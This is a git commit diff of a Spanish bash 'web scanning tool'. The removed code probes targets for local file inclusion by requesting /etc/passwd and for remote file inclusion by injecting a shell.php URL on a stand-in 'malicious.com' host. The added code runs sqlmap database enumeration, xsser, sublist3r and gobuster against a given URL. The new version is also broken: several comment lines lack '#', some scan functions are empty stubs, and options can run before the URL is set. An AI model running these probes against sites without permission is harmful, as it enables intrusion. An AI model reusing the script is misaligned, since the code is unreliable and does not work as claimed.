e1d673607b2f9faa70f0957efb1018210a04d1c1
Root/user47363/ <82620412+Rootuser47363@users.noreply.github.com>
2023-04-02 18:02:31 -0600

    Update w3bscantool2.0.sh

--- w3bscantool2.0.sh
+++ w3bscantool2.0.sh
@@ -1,124 +1,133 @@
 #!/bin/bash
 
-# Función para mostrar el banner
+Funcion para mostrar el banner y la ayuda:
 show_banner() {
-  echo "--------------------------------------"
-  echo "| w3bscantool2.0.sh                     |"
-  echo "| Herramienta de Escaneo Web         |"
-  echo "| Hecho por Root/user/47363          |"
-  echo "--------------------------------------"
-  echo ""
+echo "######################################################"
+echo "# Herramienta de escaneo web v 2.0 #"
+echo "# #"
+echo "# Escanea vulnerabilidades LFI y RFI #"
+echo "# #"
+echo "# Ejemplo de uso: ./w3bscantool2.0.sh -u <url> [-h] [-l] [-r] [-s] [-q] [-x] #"
+echo "# #"
+echo "# Opciones: #"
+echo "# -h Mostrar este mensaje de ayuda #"
+echo "# -u Especificar la URL del sitio web a escanear #"
+echo "# -l Escanear vulnerabilidades LFI #"
+echo "# -r Escanear vulnerabilidades RFI #"
+echo "# -s Escanear vulnerabilidades de SQL injection #"
+echo "# -q Escanear vulnerabilidades de CMS específicas #"
+echo "# -x Escanear vulnerabilidades de XSS #"
+echo "######################################################"
 }
 
-# Función para instalar dependencias
+
+# Funcion para instalar dependencias:
 install_deps() {
-  echo "Instalando dependencias..."
+    echo "Instalando dependencias..."
 
-  # Detectar sistema operativo
-  if [ -f /etc/debian_version ]; then
-    # Debian, Ubuntu
-    sudo apt-get update
-    sudo apt-get install -y nmap nikto
-  elif [ -f /etc/redhat-release ]; then
-    # Red Hat, CentOS, Fedora
-    sudo yum update
-    sudo yum install -y nmap nikto
-  elif [ -f /etc/arch-release ]; then
-    # Arch Linux
-    sudo pacman -Syu nmap nikto
-  else
-    echo "Error: No se pudo detectar el sistema operativo. Por favor, instale manualmente las siguientes dependencias: nmap, nikto."
-    exit 1
-  fi
-}
-
-# Función para escanear vulnerabilidades LFI
-scan_lfi() {
-  echo "Escaneando vulnerabilidades LFI en $url..."
-  curl -s "$url?page=../../../../../../../../etc/passwd" | grep -q "root:x:0:0"
-  if [ $? -eq 0 ]; then
-    echo "Vulnerabilidad LFI encontrada: es posible leer archivos del sistema."
-  else
-    echo "No se encontraron vulnerabilidades LFI."
-  fi
-}
-
-# Función para escanear vulnerabilidades RFI
-scan_rfi() {
-  echo "Escaneando vulnerabilidades RFI en $url..."
-  curl -s "$url?page=http://malicious.com/shell.php" | grep -q "Hello, world!"
-  if [ $? -eq 0 ]; then
-    echo "Vulnerabilidad RFI encontrada: es posible ejecutar código remoto."
-  else
-    echo "No se encontraron vulnerabilidades RFI."
-  fi
-}
-
-# Función principal
-main() {
-
-  # Mostrar banner
-  show_banner
-
-  # Verificar si las dependencias están instaladas
-  if ! command -v nmap >/dev/null 2>&1 || ! command -v nikto >/dev/null 2>&1; then
-    echo "Algunas de las dependencias necesarias no están instaladas."
-    read -p "¿Desea instalarlas ahora? (s/n) " -n 1 -r
-    echo
-    if [[ $REPLY =~ ^[Ss]$ ]]; then
-      install_deps
+    # Detectar sistema operativo
+    if [ -f /etc/debian_version ]; then
+        # Debian, Ubuntu
+        sudo apt-get update
+        sudo apt-get install -y nmap nikto
+    elif [ -f /etc/redhat-release ]; then
+        # Red Hat, CentOS, Fedora
+        sudo yum update
+        sudo yum install -y nmap nikto
+    elif [ -f /etc/arch-release ]; then
+        # Arch Linux
+        sudo pacman -Syu nmap nikto
     else
-      echo "Error: Las dependencias necesarias no están instaladas."
-      exit 1
+        echo "Error: No se pudo detectar el sistema operativo. Por favor, instale manualmente las siguientes dependencias: nmap, nikto."
+        exit 1
     fi
-  fi
+}
 
-  # Obtener la URL del sitio web objetivo desde el argumento -u
-  while getopts "u:" option; do
+# Funcion para escanear vulnerabilidades LFI
+scan_lfi() {
+    echo "Escaneando vulnerabilidades LFI en $url ..."
+    # Comandos para escanear LFI
+    # ...
+}
+
+# Funcion para escanear vulnerabilidades RFI
+scan_rfi() {
+    echo "Escaneando vulnerabilidades RFI en $url ..."
+    # Comandos para escanear RFI
+    # ...
+}
+
+# Funcion para escanear vulnerabilidades de SQL injection
+scan_sql_injection() {
+    echo "Escaneando vulnerabilidades de SQL injection en $url ..."
+    # Comandos para escanear SQL injection
+    sqlmap -u $url --dbs
+}
+
+# Funcion para escanear vulnerabilidades de XSS
+scan_xss() {
+    echo "Escaneando vulnerabilidades de XSS en $url ..."
+    # Comandos para escanear XSS
+    xsser -u $url
+}
+
+# Funcion para escanear subdominios
+scan_subdomains() {
+    echo "Escaneando subdominios en $url ..."
+    # Comandos para escanear subdominios
+    sublist3r -d $url
+}
+
+# Funcion para escanear archivos y directorios ocultos
+scan_hidden_files() {
+    echo "Escaneando archivos y directorios ocultos en $url ..."
+    # Comandos para escanear archivos y directorios ocultos
+    gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt
+}
+
+# Funcion para escanear vulnerabilidades de CMS especificas
+scan_cms_vulnerabilities() {
+    read -p "Ingrese el nombre del CMS que desea escanear: " cms_name
+echo "Escaneando vulnerabilidades de $cms_name en $url ..."
+# Comandos para escanear vulnerabilidades de CMS especificas
+# ...
+}
+
+Funcion principal del programa
+main() {
+show_banner
+install_deps
+# Analizar argumentos de linea de comandos
+while getopts "u:hlsrqx" option; do
     case "${option}" in
-      u)
-        url=${OPTARG}
-        ;;
+        u)
+            url=${OPTARG}
+            ;;
+        h)
+            show_banner
+            ;;
+        l)
+            scan_lfi
+            ;;
+        r)
+            scan_rfi
+            ;;
+        s)
+            scan_sql_injection
+            ;;
+        q)
+            scan_cms_vulnerabilities
+            ;;
+        x)
+            scan_xss
+            ;;
+        *)
+            echo "Opcion invalida. Ejecute el script con la opcion -h para obtener ayuda."
+            exit 1
+            ;;
     esac
-  done
+done
+}
 
-  # Verificar si se proporcionó una URL
-  if [ -z "$url" ]; then
-    echo "Error: no se proporcionó una URL. Por favor, use la opción -u para especificar la URL del sitio web objetivo."
-    exit 1
-  fi
-
-  # Leer la opción de escaneo del usuario
-echo "Seleccione una opción:"
-echo "1) Escaneo rápido de puertos"
-echo "2) Escaneo de puertos y servicios"
-echo "3) Escaneo de vulnerabilidades con Nikto"
-echo "4) Escaneo de vulnerabilidades LFI y RFI"
-read -p "> " scan_option
-
-# Realizar el escaneo seleccionado por el usuario
-case "$scan_option" in
-  1)
-    echo "Realizando escaneo rápido de puertos en $url..."
-    nmap -F $url
-    ;;
-  2)
-    echo "Realizando escaneo de puertos y servicios en $url..."
-    nmap -sV $url
-    ;;
-  3)
-    echo "Realizando escaneo de vulnerabilidades con Nikto en $url..."
-    nikto -h $url
-    ;;
-  4)
-    scan_lfi
-    scan_rfi
-    ;;
-  *)
-    echo "Opción inválida. Saliendo."
-    exit 1
-    ;;
-esac
-
-# Llamar a la función principal con paréntesis
+Llamar a la funcion principal del programa
 main "$@"
